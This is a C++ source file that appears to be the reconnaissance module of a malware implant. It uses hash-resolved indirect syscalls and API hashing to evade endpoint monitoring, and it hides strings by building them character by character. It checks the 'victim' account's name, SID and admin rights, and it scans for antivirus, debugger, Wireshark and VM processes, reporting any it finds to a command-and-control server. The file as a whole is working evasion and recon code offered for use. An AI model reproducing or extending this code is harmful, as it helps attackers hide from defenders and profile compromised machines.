#include "Modules/recon.h"
#include "Core/syscalls.h"
#include "Core/api_resolve.h"
#include "Crypto/hashing.h"
#include "Crypto/obfuscation.h"
#include "Network/c2_server.h"
#include "Utils/helpers.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>

//internal whoami
void user_id(wchar_t* outUsername) {
    HANDLE hToken = NULL;
    NTSTATUS status;
    SYSCALL_GATE gate;
    API_TABLE& API = GetAPI();

    //NtOpenProcessToken 
    gate = GetSSNByHash(0X5431B54AA40A7EA3); 
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)TOKEN_QUERY, (ULONG_PTR)&hToken, 0, 0, 0, 0,0,0,0,0); 
    }

    if (hToken) {
        DWORD len = 0;
        //NtQueryInformationToken 
        gate = GetSSNByHash(0X3B966C972A75EE00);
        PREPARE_SYSCALL(gate);
        
        IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)NULL, 0, (ULONG_PTR)&len, 0, 0,0,0,0,0);

        PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(len);
        if (pTokenUser) {
            status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)pTokenUser, (ULONG_PTR)len, (ULONG_PTR)&len, 0, 0,0,0,0,0);

            if (status == 0) {
                wchar_t name[256], domain[256];
                DWORD nSize = 256, dSize = 256;
                SID_NAME_USE peUse;

                if (API.LookupAccountSidW && API.LookupAccountSidW(NULL, pTokenUser->User.Sid, name, &nSize, domain, &dSize, &peUse)) {
                    wcscpy(outUsername, name);
                }
            }
            free(pTokenUser);
        }
        //NtClose
        gate = GetSSNByHash(0X5E575BD8ACC77BC0);
        PREPARE_SYSCALL(gate);
        IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
}

//victim privilege check
bool IsAdmin() {
    HANDLE hToken = NULL;
    NTSTATUS status;
    SYSCALL_GATE gate;
    TOKEN_ELEVATION elevation;
    DWORD len = sizeof(TOKEN_ELEVATION);
    API_TABLE& API = GetAPI();


    gate = GetSSNByHash(0X5431B54AA40A7EA3); // NtOpenProcessToken
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)TOKEN_QUERY, (ULONG_PTR)&hToken, 0, 0, 0, 0,0,0,0,0); 
    }

    if (hToken) {
        gate = GetSSNByHash(0X3B966C972A75EE00); // NtQueryInformationToken
        PREPARE_SYSCALL(gate);
        
        status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)20, (ULONG_PTR)&elevation, (ULONG_PTR)sizeof(elevation), (ULONG_PTR)&len, 0, 0,0,0,0,0);
        
        //NtClose
        gate = GetSSNByHash(0X5E575BD8ACC77BC0);
        PREPARE_SYSCALL(gate);
        IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        
        if (status == 0) {
            return (elevation.TokenIsElevated != 0);
        }
    }
    return false;
}


void GetProcessList() {
    NTSTATUS status;
    SYSCALL_GATE gate;
    ULONG_PTR bufferSize = 0;
    PVOID buffer = NULL;

    //NtQuerySystemInformation [how much memory]
    gate = GetSSNByHash(0XC427340B3A1449FE); 
    if (gate.wServiceId == 0) return;
    PREPARE_SYSCALL(gate);

    //SystemProcessInformation = 5
    IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)&bufferSize, 0, 0, 0,0,0,0,0); 

    //add size for safety
    bufferSize += 0x1000; 

    //NtAllocateVirtualMemory [memory allocation from kernel]
    gate = GetSSNByHash(0xF2A49421250FD409);
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&buffer, 0, (ULONG_PTR)&bufferSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE, 0,0,0,0,0);
        if (status != 0) return;
    }

    //NtQuerySystemInformation [list recall]
    gate = GetSSNByHash(0XC427340B3A1449FE);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)buffer, (ULONG_PTR)bufferSize, (ULONG_PTR)&bufferSize, 0,0,0,0,0,0,0);
    
    // Build process names char-by-char (no plaintext in .rdata)
    wchar_t bl0[] = {'M','s','M','p','E','n','g','.','e','x','e','\0'};
    wchar_t bl1[] = {'w','i','r','e','s','h','a','r','k','.','e','x','e','\0'};
    wchar_t bl2[] = {'x','6','4','d','b','g','.','e','x','e','\0'};
    wchar_t bl3[] = {'P','r','o','c','e','s','s','H','a','c','k','e','r','.','e','x','e','\0'};
    wchar_t bl4[] = {'v','m','t','o','o','l','s','d','.','e','x','e','\0'};
    wchar_t bl5[] = {'S','e','n','t','i','n','e','l','S','e','r','v','i','c','e','.','e','x','e','\0'};
    const wchar_t* blacklist[] = { bl0, bl1, bl2, bl3, bl4, bl5 };

    if (status == 0) {
        PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (true) {
            if (pInfo->ImageName.Buffer != NULL) {
                wchar_t imgName[261] = {0};
                USHORT charCount = pInfo->ImageName.Length / sizeof(wchar_t);
                if (charCount > 260) charCount = 260;
                custom_memcpy(imgName, pInfo->ImageName.Buffer, charCount * sizeof(wchar_t));
                imgName[charCount] = L'\0';

                for (int i = 0; i < 6; i++) {
                    if (wcsstr(imgName, blacklist[i])) {
                        char msg[256];
                        snprintf(msg, sizeof(msg), STR("CRITICAL: Suspicious process found: %ls").get(), blacklist[i]);
                        sendToC2(msg);
                    }
                }
            }
            if (pInfo->NextEntryOffset == 0) break;
            pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
        }
    }
    //NtFreeVirtualMemory [free memory]
    gate = GetSSNByHash(0X1867A58BDCAD7525);
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);
        ULONG_PTR freeSize = 0; // must be 0 for MEM_RELEASE
        IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&buffer, 0, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE, 0,0,0,0,0,0);
    }
}

DWORD GetPidByName(const wchar_t* processName) {
    DWORD targetPid = 0;
    NTSTATUS status;
    SYSCALL_GATE gate;
    ULONG_PTR bufferSize = 0;
    PVOID buffer = NULL;

    //NtQuerySystemInformation [calculate buffer size]
    gate = GetSSNByHash(0XC427340B3A1449FE); 
    if (gate.wServiceId == 0) return 0;

    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)&bufferSize, 0, 0, 0, 0, 0, 0, 0); 

    //add extra size for safety
    bufferSize += 0x2000; 

    //NtAllocateVirtualMemory [allocate memory]
    gate = GetSSNByHash(0xF2A49421250FD409);
    if (gate.wServiceId == 0) return 0;

    PREPARE_SYSCALL(gate);

    status = IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&buffer, 0, (ULONG_PTR)&bufferSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE, 0, 0, 0, 0, 0);
    
    if (status != 0) return 0;

    //NtQuerySystemInformation [get tasks list]
    gate = GetSSNByHash(0XC427340B3A1449FE);
    PREPARE_SYSCALL(gate);

    status = IndirectSyscall((ULONG_PTR)5, (ULONG_PTR)buffer, (ULONG_PTR)bufferSize, (ULONG_PTR)&bufferSize, 0, 0, 0, 0, 0, 0, 0);
    
    if (status == 0) {
        PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (true) {
            if (pInfo->ImageName.Buffer != NULL) {
                wchar_t imgName[261] = {0};
                USHORT charCount = pInfo->ImageName.Length / sizeof(wchar_t);
                if (charCount > 260) charCount = 260;
                custom_memcpy(imgName, pInfo->ImageName.Buffer, charCount * sizeof(wchar_t));
                imgName[charCount] = L'\0';

                //custom comparison
                if (custom_wcsicmp(imgName, processName)) {
                    // HANDLE casting UniqueProcessId -> DWORD
                    targetPid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
                    break; //PID found
                }
            }
            if (pInfo->NextEntryOffset == 0) break;
            pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
        }
    }

    //NtFreeVirtualMemory [cleanup]
    gate = GetSSNByHash(0X1867A58BDCAD7525);
    if (gate.wServiceId != 0) {
        
        PREPARE_SYSCALL(gate);

        ULONG_PTR freeSize = 0; 
        IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&buffer, 0, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE, 0, 0, 0, 0, 0, 0);
    }else return 0;

    return targetPid;
}


bool GetNativeUserSID(PUNICODE_STRING pSidString) {
    HANDLE hToken = NULL;
    NTSTATUS status;
    SYSCALL_GATE gate;
    ULONG returnLength = 0;
    PVOID pTokenUser = NULL; 
    SIZE_T regionSize = 0;
    API_TABLE& API = GetAPI();

    // NtOpenProcessToken
    gate = GetSSNByHash(0X5431B54AA40A7EA3); 
    if (gate.wServiceId != 0) {
        PREPARE_SYSCALL(gate);

        status = IndirectSyscall((ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)TOKEN_QUERY, (ULONG_PTR)&hToken, 0, 0, 0, 0, 0, 0, 0, 0);
        if (status != 0) return false;
    }

    // NtQueryInformationToken - size
    gate = GetSSNByHash(0X3B966C972A75EE00);
    
    PREPARE_SYSCALL(gate);
    
    status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)NULL, 0, (ULONG_PTR)&returnLength, 0, 0, 0, 0, 0, 0);

    // NtAllocateVirtualMemory (Native Allocation)
    regionSize = returnLength;
    gate = GetSSNByHash(0xF2A49421250FD409);

    PREPARE_SYSCALL(gate);

    status = IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&pTokenUser, 0, (ULONG_PTR)&regionSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE, 0, 0, 0, 0, 0);
    
    if (status != 0) {
        gate = GetSSNByHash(0X5E575BD8ACC77BC0); // NtClose
        PREPARE_SYSCALL(gate);

        IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return false;
    }

    // second NtQueryInformationToken - get data
    gate = GetSSNByHash(0X3B966C972A75EE00);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)hToken, (ULONG_PTR)TokenUser, (ULONG_PTR)pTokenUser, (ULONG_PTR)returnLength, (ULONG_PTR)&returnLength, 0, 0, 0, 0, 0, 0);

    if (status == 0) {
        // Resolve RtlConvertSidToUnicodeString 
        HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0X571A46A16587BB7A);
        typedef NTSTATUS (NTAPI *pfnRtlConvertSidToUnicodeString)(PUNICODE_STRING, PSID, BOOLEAN);
        pfnRtlConvertSidToUnicodeString RtlConv = (pfnRtlConvertSidToUnicodeString)     GetProcAddressByHash(hNtdll, 0X4232DD8F2BAD2096);
        
        if (RtlConv) {
            status = RtlConv(pSidString, ((PTOKEN_USER)pTokenUser)->User.Sid, TRUE);
        } else {
            status = -1;
        }
    }

    // NtClose Token
    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
    PREPARE_SYSCALL(gate);
    IndirectSyscall((ULONG_PTR)hToken, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

    // NtFreeVirtualMemory (Free memory)
    gate = GetSSNByHash(0X1867A58BDCAD7525);
    PREPARE_SYSCALL(gate);
    SIZE_T freeSize = 0; // must be 0 for MEM_RELEASE
    IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)&pTokenUser, 0, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE, 0, 0, 0, 0, 0, 0);

    return (status == 0);
}
